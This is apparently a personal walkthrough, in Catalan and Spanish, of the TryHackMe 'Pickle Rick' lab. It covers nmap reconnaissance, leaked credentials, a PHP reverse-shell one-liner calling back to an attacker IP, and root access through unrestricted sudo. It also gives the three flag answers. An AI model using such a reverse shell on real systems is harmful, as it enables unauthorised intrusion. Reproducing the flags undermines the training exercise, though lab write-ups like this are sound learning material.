---
publish: true
created: 2026-09-11T12:16:55.957Z
modified: 2026-09-11T18:12:58.618Z
---

# Pickle Rick

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 15 de diciembre de 2024 18:59
IP: 10.10.21.47

# **Reconocimiento**

> NMAP INICIAL

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
```

![image.png](WriteUps/images/TryHackMe/image.png)

> NMAP Servicios

```bash
 nmap -sV -script=http-enum 10.10.21.47 -vvv -oN targeted
```

![image.png](WriteUps/images/TryHackMe/image 1.png)

# Análisis de vulnerabilidades

Código fuente

![image.png](WriteUps/images/TryHackMe/image 2.png)

Username : R1ckRul3s

Accedirm a /robots.txt

![image.png](WriteUps/images/TryHackMe/image 3.png)

Accedim a /login.php i provem les credencials

![image.png](WriteUps/images/TryHackMe/image 4.png)

Llistem arxius i trobem :

**Sup3rS3cretPickl3Ingred.txt**

Si provem a obrirlo amb "CAT" ens diu que no podem executar aquest comando. Provem amb less i amb more:

> Flag 1r ingredient :	**mr. meeseek hair**

# Explotación de vulnerabilidades

Intentem conectarnos amb una rever shell i la que ens funciona es una PHPexec:

```bash
php -r '$sock=fsockopen("10.9.4.64",443);exec("bash <&3 >&3 2>&3");'
```

![image.png](WriteUps/images/TryHackMe/image 5.png)

Accedim al sistema :

Busquem diferents fichers:

![image.png](WriteUps/images/TryHackMe/image 6.png)

Entrem al home de rick i trobem el segon flag

> Flag 2n ingredient: **1 jerry tear**

# Escalada de privilegios

Busquem com ens podem convertir en root:

```bash
sudo -l
```

![image.png](WriteUps/images/TryHackMe/image 7.png)

Podem executar qualsevol comando sense password

```bash
sudo /bin/bash
```

Busquem al directori root la ultima flag:

> Flag 3: **fleeb juice**
